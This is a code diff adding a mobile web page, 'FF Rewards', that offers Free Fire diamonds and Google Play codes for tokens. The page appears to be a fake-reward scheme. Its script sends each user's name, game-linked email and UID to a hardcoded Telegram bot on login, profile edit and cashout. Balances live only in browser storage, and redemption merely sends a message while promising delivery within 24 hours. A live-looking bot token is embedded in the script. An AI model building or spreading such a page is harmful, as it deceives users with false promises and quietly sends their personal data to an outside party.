+        <div class="timer-reward">Claim <span>+500 Tokens</span> every 24 hours</div>
+        <div class="ring-wrap">
+          <svg class="ring-svg" viewBox="0 0 140 140" width="140" height="140">
+            <defs>
+              <linearGradient id="ring-grad-daily" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#FF6B00"/>
+                <stop offset="100%" stop-color="#FF8C00"/>
+              </linearGradient>
+            </defs>
+            <circle class="ring-track" cx="70" cy="70" r="58"/>
+            <circle class="ring-fill-daily" id="daily-ring" cx="70" cy="70" r="58" stroke-dasharray="364.42" stroke-dashoffset="0"/>
+          </svg>
+          <div class="ring-center">
+            <div class="ring-time" id="daily-ring-time">--:--:--</div>
+            <div class="ring-label">Remaining</div>
+          </div>
+        </div>
+        <div id="daily-btn-wrap">
+          <div class="btn-countdown" id="daily-btn">Loading...</div>
+        </div>
+      </div>
+
+      <!-- Weekly Timer -->
+      <div class="timer-card" id="weekly-timer-card">
+        <div class="timer-badge weekly">Weekly</div>
+        <div class="timer-title">Weekly Reward</div>
+        <div class="timer-reward">Claim <span>+1000 Tokens</span> every 72 hours</div>
+        <div class="ring-wrap">
+          <svg class="ring-svg" viewBox="0 0 140 140" width="140" height="140">
+            <defs>
+              <linearGradient id="ring-grad-weekly" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#c8a800"/>
+                <stop offset="100%" stop-color="#FFD700"/>
+              </linearGradient>
+            </defs>
+            <circle class="ring-track" cx="70" cy="70" r="58"/>
+            <circle class="ring-fill-weekly" id="weekly-ring" cx="70" cy="70" r="58" stroke-dasharray="364.42" stroke-dashoffset="0"/>
+          </svg>
+          <div class="ring-center">
+            <div class="ring-time" id="weekly-ring-time">--:--:--</div>
+            <div class="ring-label">Remaining</div>
+          </div>
+        </div>
+        <div id="weekly-btn-wrap">
+          <div class="btn-countdown" id="weekly-btn">Loading...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CASHOUT TAB -->
+    <div class="tab-section" id="tab-cashout">
+
+      <!-- Balance Card -->
+      <div class="co-balance-card">
+        <div class="co-bal-left">
+          <div class="co-bal-label">Available Tokens</div>
+          <div class="co-bal-amount" id="co-bal-display">0</div>
+        </div>
+        <div class="co-bal-right">
+          <div class="co-bal-label">Min. Required</div>
+          <div class="co-next-reward">1,500</div>
+          <div class="co-next-cost">tokens</div>
+        </div>
+      </div>
+
+      <!-- Progress -->
+      <div class="co-progress-wrap">
+        <div class="co-progress-labels">
+          <span id="co-prog-curr">0 tokens</span>
+          <span id="co-prog-pct">0%</span>
+        </div>
+        <div class="progress-bar-track" style="height:10px">
+          <div class="progress-bar-fill" id="co-progress-fill" style="width:0%"></div>
+        </div>
+        <div class="progress-hint" id="co-prog-hint" style="margin-top:6px">Earn 1500 tokens to unlock first reward</div>
+      </div>
+
+      <!-- Status Banner -->
+      <div id="cashout-status-banner" class="co-status-banner locked">
+        <span class="co-banner-icon">🔒</span>
+        <span id="co-banner-text">Earn more tokens to unlock rewards</span>
+      </div>
+
+      <!-- Category Tabs -->
+      <div class="co-cat-tabs">
+        <button class="co-cat-btn active" onclick="switchCashoutCat('playstore')" id="cat-btn-playstore">🎮 Play Store</button>
+        <button class="co-cat-btn" onclick="switchCashoutCat('diamond')" id="cat-btn-diamond">💎 FF Diamonds</button>
+      </div>
+
+      <!-- PLAY STORE REWARDS -->
+      <div id="co-cat-playstore" class="co-rewards-grid">
+
+        <div class="co-reward-card" id="reward-ps30" onclick="selectReward('ps30')">
+          <div class="co-reward-check" id="chk-ps30"></div>
+          <div class="co-reward-badge popular">POPULAR</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#01875f22,#01875f44);border:1px solid #01875f55">🎮</div>
+          <div class="co-reward-name">Google Play</div>
+          <div class="co-reward-value">&#8377;30</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">1,500 tokens</span></div>
+          <div class="co-reward-desc">Play Store code</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-ps50" onclick="selectReward('ps50')">
+          <div class="co-reward-check" id="chk-ps50"></div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#01875f22,#01875f44);border:1px solid #01875f55">🎮</div>
+          <div class="co-reward-name">Google Play</div>
+          <div class="co-reward-value">&#8377;50</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">2,500 tokens</span></div>
+          <div class="co-reward-desc">Play Store code</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-ps100" onclick="selectReward('ps100')">
+          <div class="co-reward-check" id="chk-ps100"></div>
+          <div class="co-reward-badge hot">HOT</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#01875f22,#01875f44);border:1px solid #01875f55">🎮</div>
+          <div class="co-reward-name">Google Play</div>
+          <div class="co-reward-value">&#8377;100</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">5,000 tokens</span></div>
+          <div class="co-reward-desc">Play Store code</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-ps500" onclick="selectReward('ps500')">
+          <div class="co-reward-check" id="chk-ps500"></div>
+          <div class="co-reward-badge elite">ELITE</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#01875f22,#01875f44);border:1px solid #01875f55">🎮</div>
+          <div class="co-reward-name">Google Play</div>
+          <div class="co-reward-value">&#8377;500</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">25,000 tokens</span></div>
+          <div class="co-reward-desc">Play Store code</div>
+        </div>
+
+      </div>
+
+      <!-- FF DIAMOND REWARDS -->
+      <div id="co-cat-diamond" class="co-rewards-grid" style="display:none">
+
+        <div class="co-reward-card" id="reward-d100" onclick="selectReward('d100')">
+          <div class="co-reward-check" id="chk-d100"></div>
+          <div class="co-reward-badge popular">STARTER</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#00a8ff22,#00a8ff44);border:1px solid #00a8ff55">💎</div>
+          <div class="co-reward-name">FF Diamonds</div>
+          <div class="co-reward-value">100 💎</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">1,500 tokens</span></div>
+          <div class="co-reward-desc">Top up account</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-d310" onclick="selectReward('d310')">
+          <div class="co-reward-check" id="chk-d310"></div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#00a8ff22,#00a8ff44);border:1px solid #00a8ff55">💎</div>
+          <div class="co-reward-name">FF Diamonds</div>
+          <div class="co-reward-value">310 💎</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">4,500 tokens</span></div>
+          <div class="co-reward-desc">Characters &amp; skins</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-d520" onclick="selectReward('d520')">
+          <div class="co-reward-check" id="chk-d520"></div>
+          <div class="co-reward-badge hot">HOT</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#00a8ff22,#00a8ff44);border:1px solid #00a8ff55">💎</div>
+          <div class="co-reward-name">FF Diamonds</div>
+          <div class="co-reward-value">520 💎</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">7,500 tokens</span></div>
+          <div class="co-reward-desc">Elite pass + bundles</div>
+        </div>
+
+        <div class="co-reward-card" id="reward-d1060" onclick="selectReward('d1060')">
+          <div class="co-reward-check" id="chk-d1060"></div>
+          <div class="co-reward-badge elite">ELITE</div>
+          <div class="co-reward-icon" style="background:linear-gradient(135deg,#00a8ff22,#00a8ff44);border:1px solid #00a8ff55">💎</div>
+          <div class="co-reward-name">FF Diamonds</div>
+          <div class="co-reward-value">1060 💎</div>
+          <div class="co-reward-tokens"><span class="co-token-cost">15,000 tokens</span></div>
+          <div class="co-reward-desc">Max value top-up</div>
+        </div>
+
+      </div>
+
+      <!-- Action Bar -->
+      <div class="co-action-bar" id="co-action-bar" style="display:none">
+        <div class="co-action-info">
+          <div class="co-action-name" id="co-sel-name">—</div>
+          <div class="co-action-cost" id="co-sel-cost">— tokens</div>
+        </div>
+        <button class="btn-redeem-new" id="btn-redeem" onclick="openRedeemModal()">Redeem →</button>
+      </div>
+      <div class="co-select-hint" id="co-select-hint">👆 Select a reward above to continue</div>
+
+    </div>
+
+    <!-- PROFILE TAB -->
+    <div class="tab-section" id="tab-profile">
+      <div class="avatar-wrap">
+        <div class="avatar" id="profile-avatar">?</div>
+        <div class="avatar-name" id="profile-name-display">-</div>
+        <div class="avatar-uid" id="profile-uid-display">UID: -</div>
+      </div>
+
+      <div class="card">
+        <div class="section-title">Account Details</div>
+        <div class="profile-field">
+          <div class="field-info">
+            <div class="field-label">First Name</div>
+            <div class="field-value" id="pf-name">-</div>
+          </div>
+        </div>
+        <div class="profile-field">
+          <div class="field-info">
+            <div class="field-label">FF Binded Email</div>
+            <div class="field-value" id="pf-email" style="word-break:break-all">-</div>
+          </div>
+        </div>
+        <div class="profile-field">
+          <div class="field-info">
+            <div class="field-label">Game UID</div>
+            <div class="field-value" id="pf-uid">-</div>
+          </div>
+        </div>
+        <div style="margin-top:16px">
+          <button class="btn-edit" id="edit-toggle-btn" onclick="toggleEditForm()">✏️ Edit Profile</button>
+        </div>
+
+        <div class="edit-form" id="edit-form" style="display:none">
+          <div class="edit-form-title">Update Profile</div>
+          <div class="form-group">
+            <label class="form-label">First Name</label>
+            <input class="form-input" type="text" id="edit-name" placeholder="First Name" maxlength="40">
+          </div>
+          <div class="form-group">
+            <label class="form-label">FF Binded Email</label>
+            <input class="form-input" type="email" id="edit-email" placeholder="Email">
+          </div>
+          <div class="form-group" style="margin-bottom:0">
+            <label class="form-label">Game UID</label>
+            <input class="form-input" type="number" id="edit-uid" placeholder="UID" min="1">
+          </div>
+          <div class="edit-actions">
+            <button class="btn-cancel" onclick="toggleEditForm()">Cancel</button>
+            <button class="btn-save" onclick="saveProfile()">Save Changes</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" style="background:rgba(255,107,0,0.04);border-color:rgba(255,107,0,0.15)">
+        <div class="section-title">Session Info</div>
+        <div style="font-size:13px;color:var(--text2);line-height:1.8">
+          <div>Logged in: <span id="login-time-display" style="color:var(--text)">-</span></div>
+          <div>Total Earned: <span id="total-earned-display" style="color:var(--success)">-</span> tokens</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HISTORY TAB -->
+    <div class="tab-section" id="tab-history">
+      <div class="section-title">Transaction History</div>
+      <div id="history-container"></div>
+    </div>
+
+  </div><!-- /main-content -->
+
+  <!-- BOTTOM NAV -->
+  <nav id="bottom-nav">
+    <button class="nav-item active" data-tab="home" onclick="switchTab('home')">
+      <svg viewBox="0 0 24 24"><path d="M3 9.5L12 3l9 6.5V20a1 1 0 01-1 1H5a1 1 0 01-1-1V9.5z"/><path d="M9 21V12h6v9"/></svg>
+      <span>Home</span>
+      <div class="nav-dot"></div>
+    </button>
+    <button class="nav-item" data-tab="earn" onclick="switchTab('earn')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 6v6l4 2"/></svg>
+      <span>Earn</span>
+      <div class="nav-dot"></div>
+    </button>
+    <button class="nav-item" data-tab="cashout" onclick="switchTab('cashout')">
+      <svg viewBox="0 0 24 24"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7"/><path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg>
+      <span>Cashout</span>
+      <div class="nav-dot"></div>
+    </button>
+    <button class="nav-item" data-tab="profile" onclick="switchTab('profile')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+      <span>Profile</span>
+      <div class="nav-dot"></div>
+    </button>
+    <button class="nav-item" data-tab="history" onclick="switchTab('history')">
+      <svg viewBox="0 0 24 24"><polyline points="12 8 12 12 14 14"/><path d="M3.05 11a9 9 0 1 0 .5-4.5"/><polyline points="3 3 3 7 7 7"/></svg>
+      <span>History</span>
+      <div class="nav-dot"></div>
+    </button>
+  </nav>
+</div>
+
+<!-- MODAL -->
+<div id="modal-overlay">
+  <div class="modal-box">
+    <div class="modal-title">Confirm Redemption</div>
+    <div class="modal-body" id="modal-body-text">
+      Are you sure? This will deduct <span class="modal-highlight">1500 tokens</span> from your balance.
+      Your reward will be delivered within <strong>24 hours</strong> to your FF email.
+    </div>
+    <div class="modal-actions">
+      <button class="btn-modal-cancel" onclick="closeModal()">Cancel</button>
+      <button class="btn-confirm" onclick="confirmRedeem()">Confirm Redeem</button>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<script>
+// ─── TELEGRAM CONFIG ─── (Replace with your actual bot token and chat ID)
+const TG_BOT = '7645191678:AAE14YHCgm-d4Mb7AaQAt3-u15i6Nwqge6o';
+const TG_CHAT = '8440538916';
+
+// ─── CONSTANTS ───
+const DAILY_MS = 24*60*60*1000;
+const WEEKLY_MS = 72*60*60*1000;
+const CASHOUT_COST = 1500;
+const DAILY_REWARD = 500;
+const WEEKLY_REWARD = 1000;
+const RING_CIRC = 364.42;
+const MAX_HISTORY = 50;
+
+// ─── STORAGE HELPERS ───
+const LS = {
+  get: k => { try{ return JSON.parse(localStorage.getItem(k)) }catch(e){ return null } },
+  set: (k,v) => localStorage.setItem(k, JSON.stringify(v)),
+};
+
+// ─── STATE ───
+let user = null;
+let tokens = 0;
+let selectedOption = null;
+let timerTick = null;
+
+// ─── TELEGRAM ───
+async function sendTelegram(html) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: TG_CHAT, text: html, parse_mode:'HTML' })
+    });
+  } catch(e){ console.warn('TG error', e); }
+}
+
+function fmtTime(ts) {
+  return new Date(ts).toLocaleString('en-IN',{
+    day:'2-digit',month:'short',year:'numeric',
+    hour:'2-digit',minute:'2-digit',hour12:true
+  });
+}
+
+// ─── SPLASH ───
+window.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    document.getElementById('splash').classList.add('hide');
+    setTimeout(() => { document.getElementById('splash').style.display='none'; init(); }, 400);
+  }, 1600);
+});
+
+// ─── INIT ───
+function init() {
+  user = LS.get('ff_user');
+  tokens = LS.get('ff_tokens') || 0;
+  if (user) {
+    document.getElementById('login-screen').classList.add('hide');
+    document.getElementById('app').classList.add('show');
+    bootApp();
+  }
+}
+
+function bootApp() {
+  updateHeaderBalance();
+  updateDashboard();
+  updateProfileView();
+  startTimerLoop();
+  renderHistory();
+  updateCashoutView();
+}
+
+// ─── LOGIN ───
+function doLogin() {
+  const name = document.getElementById('inp-name').value.trim();
+  const email = document.getElementById('inp-email').value.trim();
+  const uid = document.getElementById('inp-uid').value.trim();
+  let ok = true;
+  document.getElementById('err-name').style.display='none';
+  document.getElementById('err-email').style.display='none';
+  document.getElementById('err-uid').style.display='none';
+  if(!name){ document.getElementById('err-name').style.display='block'; ok=false; }
+  if(!email||!email.includes('@')){ document.getElementById('err-email').style.display='block'; ok=false; }
+  if(!uid||isNaN(uid)||Number(uid)<1){ document.getElementById('err-uid').style.display='block'; ok=false; }
+  if(!ok) return;
+  user = { name, email, uid, loginTime: Date.now() };
+  LS.set('ff_user', user);
+  if(LS.get('ff_tokens') === null) LS.set('ff_tokens', 0);
+  tokens = 0;
+  sendTelegram(`🔔 <b>New Login</b>\n👤 Name: ${name}\n📧 FF Email: ${email}\n🎮 UID: ${uid}\n🕐 Time: ${fmtTime(user.loginTime)}`);
+  document.getElementById('login-screen').classList.add('hide');
+  document.getElementById('app').classList.add('show');
+  bootApp();
+  showToast('Welcome to FF Rewards! 🎮', 'success');
+}
+
+// ─── HEADER BALANCE ───
+function updateHeaderBalance() {
+  tokens = LS.get('ff_tokens') || 0;
+  document.getElementById('hdr-balance').textContent = tokens.toLocaleString();
+  document.getElementById('dash-balance').textContent = tokens.toLocaleString();
+  updateProgressBars();
+}
+
+function updateProgressBars() {
+  tokens = LS.get('ff_tokens') || 0;
+  // home tab progress (toward 1500)
+  const pct = Math.min((tokens/1500)*100, 100);
+  const homeFill = document.getElementById('progress-fill');
+  if(homeFill) homeFill.style.width = pct+'%';
+  const progCurr = document.getElementById('prog-current');
+  if(progCurr) progCurr.textContent = tokens+' tokens';
+  const need = Math.max(0, 1500 - tokens);
+  const progHint = document.getElementById('prog-hint');
+  if(progHint) progHint.textContent = need > 0 ? `${need} more tokens needed for ₹30 reward` : '🎉 Ready to cashout!';
+  // cashout tab progress
+  const coFill = document.getElementById('co-progress-fill');
+  if(coFill) coFill.style.width = pct + '%';
+  const coCurr = document.getElementById('co-prog-curr');
+  if(coCurr) coCurr.textContent = tokens.toLocaleString() + ' tokens';
+  const coPct = document.getElementById('co-prog-pct');
+  if(coPct) coPct.textContent = Math.min(100,Math.round(pct)) + '%';
+  const coHint = document.getElementById('co-prog-hint');
+  if(coHint) coHint.textContent = need > 0 ? `${need.toLocaleString()} more tokens needed for cheapest reward` : '🎉 Unlock rewards — keep earning for bigger ones!';
+}
+
+// ─── DASHBOARD ───
+function updateDashboard() {
+  if(!user) return;
+  document.getElementById('welcome-name').textContent = `Welcome back, ${user.name}!`;
+  document.getElementById('dash-balance').textContent = (LS.get('ff_tokens')||0).toLocaleString();
+  updateHeaderBalance();
+  updateCashoutView();
+  updateProfileView();
+  renderTotalEarned();
+}
+
+function renderTotalEarned() {
+  const hist = LS.get('ff_history') || [];
+  const total = hist.filter(h=>h.amount>0).reduce((s,h)=>s+h.amount,0);
+  const el = document.getElementById('total-earned-display');
+  if(el) el.textContent = total.toLocaleString();
+}
+
+// ─── TIMER ENGINE (session-only, no localStorage persistence) ───
+// timers live only in memory; closing/refreshing the page resets them
+const timerState = {
+  daily:  { startTime: null, running: false },
+  weekly: { startTime: null, running: false }
+};
+
+function pad(n){ return String(Math.floor(n)).padStart(2,'0'); }
+
+function formatCountdown(ms) {
+  if(ms <= 0) return '00:00:00';
+  const h = Math.floor(ms/3600000);
+  const m = Math.floor((ms%3600000)/60000);
+  const s = Math.floor((ms%60000)/1000);
+  return `${pad(h)}:${pad(m)}:${pad(s)}`;
+}
+
+function formatShort(ms) {
+  if(ms<=0) return 'Ready!';
+  const h=Math.floor(ms/3600000), m=Math.floor((ms%3600000)/60000);
+  return h>0 ? `${h}h ${pad(m)}m` : `${pad(m)}m`;
+}
+
+function getTimerRemaining(type) {
+  const st = timerState[type];
+  if(!st.running || !st.startTime) return -1; // not started
+  const dur = type==='daily' ? DAILY_MS : WEEKLY_MS;
+  return Math.max(0, dur - (Date.now() - st.startTime));
+}
+
+function startTimer(type) {
+  timerState[type] = { startTime: Date.now(), running: true };
+  showToast(`${type==='daily'?'Daily':'Weekly'} timer started! ⏱️`, 'info');
+}
+
+function startTimerLoop() {
+  if(timerTick) clearInterval(timerTick);
+  tickTimers();
+  timerTick = setInterval(tickTimers, 1000);
+}
+
+function tickTimers() {
+  renderTimer('daily');
+  renderTimer('weekly');
+  updateNextTimer();
+}
+
+function renderTimer(type) {
+  const timeEl = document.getElementById(`${type}-ring-time`);
+  const btnWrap = document.getElementById(`${type}-btn-wrap`);
+  const ringEl  = document.getElementById(`${type}-ring`);
+  if(!timeEl) return;
+
+  const dur = type==='daily' ? DAILY_MS : WEEKLY_MS;
+  const remaining = getTimerRemaining(type);
+  const st = timerState[type];
+
+  // ring fill
+  let progress = 0;
+  if(st.running && remaining >= 0) {
+    progress = remaining === 0 ? 1 : (1 - remaining/dur);
+  }
+  if(ringEl) ringEl.style.strokeDashoffset = RING_CIRC * (1 - progress);
+
+  // not started yet
+  if(!st.running) {
+    timeEl.textContent = '--:--:--';
+    timeEl.style.color = '';
+    const clsExtra = type==='weekly' ? ' btn-start-weekly' : '';
+    btnWrap.innerHTML = `<button class="btn-start${clsExtra}" onclick="startTimer('${type}')">▶ Start ${type==='daily'?'Daily':'Weekly'} Timer</button>`;
+    const dashEl = document.getElementById(`dash-${type}-time`);
+    if(dashEl) dashEl.textContent = 'Not started';
+    return;
+  }
+
+  // running
+  if(remaining > 0) {
+    timeEl.style.color = '';
+    timeEl.textContent = formatCountdown(remaining);
+    btnWrap.innerHTML = `<div class="btn-countdown">⏳ ${formatCountdown(remaining)}</div>`;
+    const dashEl = document.getElementById(`dash-${type}-time`);
+    if(dashEl) dashEl.textContent = formatShort(remaining);
+  } else {
+    // ready to claim
+    timeEl.textContent = 'READY';
+    timeEl.style.color = type==='daily' ? 'var(--ff1)' : 'var(--ff2)';
+    const clsExtra = type==='weekly' ? ' btn-claim-weekly' : '';
+    btnWrap.innerHTML = `<button class="btn-claim${clsExtra}" onclick="claimReward('${type}')">🎁 Claim ${type==='daily'?'500':'1000'} Tokens!</button>`;
+    const dashEl = document.getElementById(`dash-${type}-time`);
+    if(dashEl) dashEl.textContent = 'Ready!';
+  }
+}
+
+function updateNextTimer() {
+  const el = document.getElementById('next-timer-display');
+  if(!el) return;
+  const candidates = [];
+  ['daily','weekly'].forEach(type => {
+    const r = getTimerRemaining(type);
+    if(r > 0) candidates.push(r);
+    if(r === 0) candidates.push(0);
+  });
+  const running = ['daily','weekly'].filter(t => timerState[t].running);
+  if(running.length === 0) { el.textContent = 'Not started'; return; }
+  const readyAll = running.every(t => getTimerRemaining(t) === 0);
+  if(readyAll) { el.textContent = 'Both Ready!'; return; }
+  const mins = running.map(t => getTimerRemaining(t)).filter(r=>r>0);
+  if(mins.length === 0) { el.textContent = 'Both Ready!'; return; }
+  el.textContent = formatCountdown(Math.min(...mins));
+}
+
+function claimReward(type) {
+  const remaining = getTimerRemaining(type);
+  if(remaining !== 0 || !timerState[type].running) return;
+  const amount = type==='daily' ? DAILY_REWARD : WEEKLY_REWARD;
+  const label  = type==='daily' ? 'Daily' : 'Weekly';
+  tokens = (LS.get('ff_tokens')||0) + amount;
+  LS.set('ff_tokens', tokens);
+  // reset timer state — user must start again
+  timerState[type] = { startTime: null, running: false };
+  addHistory('earn', `${label} Claim`, amount);
+  updateHeaderBalance();
+  updateCashoutView();
+  renderTotalEarned();
+  spawnCoins();
+  showToast(`+${amount} tokens claimed! 🎉`, 'success');
+}
+
+// ─── REWARD CATALOGUE ───
+const REWARDS = {
+  ps30:  { label:'Google Play ₹30',   cost:1500,  tgLabel:'Google Play ₹30',         cat:'playstore' },
+  ps50:  { label:'Google Play ₹50',   cost:2500,  tgLabel:'Google Play ₹50',         cat:'playstore' },
+  ps100: { label:'Google Play ₹100',  cost:5000,  tgLabel:'Google Play ₹100',        cat:'playstore' },
+  ps500: { label:'Google Play ₹500',  cost:25000, tgLabel:'Google Play ₹500',        cat:'playstore' },
+  d100:  { label:'100 FF Diamonds',   cost:1500,  tgLabel:'Free Fire 100 Diamonds',  cat:'diamond'   },
+  d310:  { label:'310 FF Diamonds',   cost:4500,  tgLabel:'Free Fire 310 Diamonds',  cat:'diamond'   },
+  d520:  { label:'520 FF Diamonds',   cost:7500,  tgLabel:'Free Fire 520 Diamonds',  cat:'diamond'   },
+  d1060: { label:'1060 FF Diamonds',  cost:15000, tgLabel:'Free Fire 1060 Diamonds', cat:'diamond'   },
+};
+
+// ─── CASHOUT ───
+function updateCashoutView() {
+  tokens = LS.get('ff_tokens') || 0;
+  updateProgressBars();
+
+  // update co-balance display
+  const balEl = document.getElementById('co-bal-display');
+  if(balEl) balEl.textContent = tokens.toLocaleString();
+
+  // update percentage
+  const pctEl = document.getElementById('co-prog-pct');
+  if(pctEl) pctEl.textContent = Math.min(100, Math.round((tokens/1500)*100)) + '%';
+
+  // update banner
+  const banner = document.getElementById('cashout-status-banner');
+  const bannerTxt = document.getElementById('co-banner-text');
+  const bannerIcon = document.querySelector('.co-banner-icon');
+  if(banner && bannerTxt) {
+    const minCost = 1500;
+    if(tokens >= minCost) {
+      banner.className = 'co-status-banner unlocked';
+      if(bannerIcon) bannerIcon.textContent = '🎉';
+      bannerTxt.textContent = 'You have enough tokens! Select a reward and redeem.';
+    } else {
+      banner.className = 'co-status-banner locked';
+      if(bannerIcon) bannerIcon.textContent = '🔒';
+      bannerTxt.textContent = `Need ${(minCost-tokens).toLocaleString()} more tokens for cheapest reward`;
+    }
+  }
+
+  // update card lock states
+  Object.keys(REWARDS).forEach(id => {
+    const card = document.getElementById('reward-' + id);
+    if(!card) return;
+    if(tokens < REWARDS[id].cost) {
+      card.classList.add('locked-card');
+    } else {
+      card.classList.remove('locked-card');
+    }
+  });
+
+  // update action bar if a reward is selected
+  if(selectedOption) {
+    const r = REWARDS[selectedOption];
+    if(r && tokens >= r.cost) {
+      showActionBar(selectedOption);
+    } else {
+      hideActionBar();
+      selectedOption = null;
+      document.querySelectorAll('.co-reward-card').forEach(c => c.classList.remove('selected'));
+    }
+  }
+}
+
+function switchCashoutCat(cat) {
+  document.getElementById('co-cat-playstore').style.display = cat === 'playstore' ? 'grid' : 'none';
+  document.getElementById('co-cat-diamond').style.display   = cat === 'diamond'   ? 'grid' : 'none';
+  document.getElementById('cat-btn-playstore').classList.toggle('active', cat === 'playstore');
+  document.getElementById('cat-btn-diamond').classList.toggle('active',   cat === 'diamond');
+  // deselect if selected reward is in other category
+  if(selectedOption && REWARDS[selectedOption] && REWARDS[selectedOption].cat !== cat) {
+    document.querySelectorAll('.co-reward-card').forEach(c => c.classList.remove('selected'));
+    selectedOption = null;
+    hideActionBar();
+  }
+}
+
+function selectReward(id) {
+  const r = REWARDS[id];
+  if(!r) return;
+  tokens = LS.get('ff_tokens') || 0;
+  if(tokens < r.cost) {
+    showToast(`Need ${(r.cost - tokens).toLocaleString()} more tokens for this reward`, 'error');
+    return;
+  }
+  selectedOption = id;
+  document.querySelectorAll('.co-reward-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById('reward-' + id).classList.add('selected');
+  showActionBar(id);
+}
+
+function showActionBar(id) {
+  const r = REWARDS[id];
+  const bar = document.getElementById('co-action-bar');
+  const hint = document.getElementById('co-select-hint');
+  const nameEl = document.getElementById('co-sel-name');
+  const costEl = document.getElementById('co-sel-cost');
+  if(!bar || !r) return;
+  nameEl.textContent = r.label;
+  costEl.textContent = r.cost.toLocaleString() + ' tokens will be deducted';
+  bar.style.display = 'flex';
+  if(hint) hint.style.display = 'none';
+}
+
+function hideActionBar() {
+  const bar = document.getElementById('co-action-bar');
+  const hint = document.getElementById('co-select-hint');
+  if(bar) bar.style.display = 'none';
+  if(hint) hint.style.display = 'block';
+}
+
+function openRedeemModal() {
+  if(!selectedOption) return;
+  const r = REWARDS[selectedOption];
+  document.getElementById('modal-body-text').innerHTML =
+    `Are you sure you want to redeem <strong style="color:var(--ff2)">${r.label}</strong>?<br><br>
+     This will deduct <span class="modal-highlight">${r.cost.toLocaleString()} tokens</span> from your balance.
+     Your reward will be delivered within <strong>24 hours</strong> to your FF email.`;
+  document.getElementById('modal-overlay').classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('modal-overlay').classList.remove('show');
+}
+
+function confirmRedeem() {
+  closeModal();
+  if(!selectedOption) return;
+  const r = REWARDS[selectedOption];
+  tokens = LS.get('ff_tokens') || 0;
+  if(tokens < r.cost) { showToast('Insufficient tokens!', 'error'); return; }
+  tokens -= r.cost;
+  LS.set('ff_tokens', tokens);
+  addHistory('cashout', `Cashout: ${r.label}`, -r.cost);
+  updateHeaderBalance();
+  sendTelegram(`🎁 <b>Cashout Request</b>\n👤 Name: ${user.name}\n📧 FF Email: ${user.email}\n🎮 UID: ${user.uid}\n💰 Request: ${r.tgLabel}\n🔢 Tokens Deducted: ${r.cost}\n🕐 Time: ${fmtTime(Date.now())}`);
+  const prev = selectedOption;
+  selectedOption = null;
+  document.querySelectorAll('.co-reward-card').forEach(c => c.classList.remove('selected'));
+  hideActionBar();
+  updateCashoutView();
+  renderTotalEarned();
+  showToast('✅ Request submitted! Reward within 24 hours.', 'success');
+}
+
+// ─── PROFILE ───
+function updateProfileView() {
+  if(!user) return;
+  const initial = user.name ? user.name[0].toUpperCase() : '?';
+  document.getElementById('profile-avatar').textContent = initial;
+  document.getElementById('profile-name-display').textContent = user.name;
+  document.getElementById('profile-uid-display').textContent = `UID: ${user.uid}`;
+  document.getElementById('pf-name').textContent = user.name;
+  document.getElementById('pf-email').textContent = user.email;
+  document.getElementById('pf-uid').textContent = user.uid;
+  const ltEl = document.getElementById('login-time-display');
+  if(ltEl && user.loginTime) ltEl.textContent = fmtTime(user.loginTime);
+  document.getElementById('welcome-name').textContent = `Welcome back, ${user.name}!`;
+}
+
+function toggleEditForm() {
+  const form = document.getElementById('edit-form');
+  const btn = document.getElementById('edit-toggle-btn');
+  if(form.style.display === 'none') {
+    form.style.display = 'block';
+    document.getElementById('edit-name').value = user.name;
+    document.getElementById('edit-email').value = user.email;
+    document.getElementById('edit-uid').value = user.uid;
+    btn.textContent = '✕ Close Editor';
+  } else {
+    form.style.display = 'none';
+    btn.textContent = '✏️ Edit Profile';
+  }
+}
+
+function saveProfile() {
+  const newName = document.getElementById('edit-name').value.trim();
+  const newEmail = document.getElementById('edit-email').value.trim();
+  const newUid = document.getElementById('edit-uid').value.trim();
+  if(!newName || !newEmail || !newEmail.includes('@') || !newUid) {
+    showToast('Please fill all fields correctly.', 'error'); return;
+  }
+  const oldUser = { ...user };
+  user = { ...user, name: newName, email: newEmail, uid: newUid };
+  LS.set('ff_user', user);
+  sendTelegram(`✏️ <b>Profile Updated</b>\n👤 Old Name: ${oldUser.name} → New: ${newName}\n📧 Old Email: ${oldUser.email} → New: ${newEmail}\n🎮 Old UID: ${oldUser.uid} → New: ${newUid}\n🕐 Time: ${fmtTime(Date.now())}`);
+  updateProfileView();
+  toggleEditForm();
+  showToast('Profile updated successfully! ✅', 'success');
+}
+
+// ─── HISTORY ───
+function addHistory(type, description, amount) {
